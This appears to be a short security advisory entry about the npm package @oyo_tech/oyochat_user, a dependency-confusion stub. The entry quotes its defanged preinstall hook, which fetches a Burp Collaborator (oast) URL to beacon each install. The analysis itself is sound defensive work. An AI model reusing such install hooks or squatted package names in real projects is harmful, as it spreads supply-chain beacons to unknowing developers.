  "summary": "Security-research / proof-of-concept package: @oyo_tech/oyochat_user (npm)",
  "details": "The package is a minimal stub (package.json + index.js) that runs a preinstall hook on install. The hook executes `node -e \"fetch('hxxps://dc[.]installed[.]da24gtar47nuepat1pu053x3cgyweiaom[.]oast[.]me/'+process.env.npm_package_name)\"`, making an outbound HTTP request to an attacker-controlled Burp Collaborator (oast[.]me) host with the package name appended to the URL path. This beacons install activity to the remote host. The package is published at version 100.0.0 on a scoped name with no repository, consistent with a dependency-confusion/version-squat stub.",
